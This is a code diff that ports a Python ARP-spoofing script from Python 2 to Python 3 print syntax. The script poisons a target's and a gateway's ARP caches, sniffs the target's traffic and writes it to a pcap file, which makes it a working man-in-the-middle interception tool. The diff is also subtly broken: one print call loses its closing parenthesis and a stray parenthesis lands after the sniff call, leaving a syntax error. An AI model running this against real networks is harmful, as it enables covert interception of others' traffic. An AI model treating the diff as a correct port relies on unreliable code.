@@ -14,7 +14,7 @@ poisoning    = True
 def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
     
     # slightly different method using send
-    print "[*] Restoring target..."
+    print("[*] Restoring target...")
     send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
     send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
@@ -35,7 +35,7 @@ def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
     poison_target = ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst=target_mac)
     poison_gateway = ARP(op=2,psrc=target_ip,pdst=gateway_ip,hwdst=gateway_mac)
 
-    print "[*] Beginning the ARP poison. [CTRL-C to stop]"
+    print("[*] Beginning the ARP poison. [CTRL-C to stop]")
 
     while poisoning:
         send(poison_target)
@@ -43,7 +43,7 @@ def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
           
         time.sleep(0.5)
           
-    print "[*] ARP poison attack finished."
+    print("[*] ARP poison attack finished.")
 
     return
 
@@ -53,33 +53,33 @@ conf.verb  = 0
 gateway_mac = get_mac(gateway_ip)
 
 if gateway_mac is None:
-    print "[!!!] Failed to get gateway MAC. Exiting."
+    print("[!!!] Failed to get gateway MAC. Exiting.")
     sys.exit(0)
 else:
-    print "[*] Gateway %s is at %s" % (gateway_ip,gateway_mac)
+    print("[*] Gateway %s is at %s" % (gateway_ip,gateway_mac))
 
 target_mac = get_mac(target_ip)
 
 if target_mac is None:
-    print "[!!!] Failed to get target MAC. Exiting."
+    print("[!!!] Failed to get target MAC. Exiting.")
     sys.exit(0)
 else:
-    print "[*] Target %s is at %s" % (target_ip,target_mac)
+    print("[*] Target %s is at %s" % (target_ip,target_mac))
     
 # start poison thread
 poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac,target_ip,target_mac))
 poison_thread.start()
 
 try:
-    print "[*] Starting sniffer for %d packets" % packet_count
+    print("[*] Starting sniffer for %d packets" % packet_count
     bpf_filter  = "ip host %s" % target_ip
-    packets = sniff(count=packet_count,filter=bpf_filter)    
+    packets = sniff(count=packet_count,filter=bpf_filter) )   
 except KeyboardInterrupt:
 	pass
 
 finally:
     # write out the captured packets
-    print "[*] Writing packets to arper.pcap"
+    print("[*] Writing packets to arper.pcap")
     wrpcap('arper.pcap',packets)
 
     poisoning = False
